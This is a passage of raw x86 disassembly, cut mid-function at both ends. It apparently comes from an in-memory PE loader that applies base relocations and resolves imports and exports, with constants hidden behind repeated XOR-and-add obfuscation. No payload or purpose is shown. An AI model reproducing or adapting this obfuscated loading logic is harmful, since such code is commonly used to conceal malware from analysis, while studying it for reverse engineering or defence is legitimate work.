  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
